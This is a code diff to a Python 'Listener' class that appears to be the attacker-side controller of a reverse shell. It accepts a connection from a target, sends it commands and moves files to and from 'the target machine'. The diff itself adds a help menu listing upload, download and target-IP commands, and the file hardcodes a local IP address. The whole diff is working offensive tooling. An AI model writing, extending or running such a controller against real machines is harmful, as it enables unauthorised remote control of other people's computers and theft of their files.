@@ -21,7 +21,8 @@ class Listener:
         # and the address bounded to the connection)
         (self.connection, address) = listener.accept()
         print("[+] Got a connection from " + str(address))
-        print("- Please, type exit to end the season and close the program.")
+        print("- Please, type exit to end the season and close the program."
+              "\n- Type h or help for more info.")
 
     def reliable_send(self, data):
         # Wraps the data to a json object
@@ -58,6 +59,13 @@ class Listener:
             exit()
         return self.reliable_recieve()
 
+    def help(self):
+        return("\n - ls: (Display current directory from listener machine)"
+               "\n\n - pwd: (Display path from current directory)"
+               "\n\n - put / upload: (Upload a file to the target machine)"
+               "\n\n - get / download: (Download a file from the target machine)"
+               "\n\n - ip: (Shows target's IPs)")
+
     def run(self):
         while True:
             linux = False
@@ -71,6 +79,9 @@ class Listener:
                 linux = True
                 print("\n")
                 result = subprocess.check_output("ls")
+            if command[0].upper() == "H" or command[0].upper() == "HELP":
+                linux = True
+                result = self.help()
             if command[0] == "pwd":
                 linux = True
                 print("\n")
@@ -95,6 +106,7 @@ class Listener:
                 else:
                     print("[!] Please, specify the file you want to download.")
             print(result)
+
 
 
 ip = "192.168.1.113"
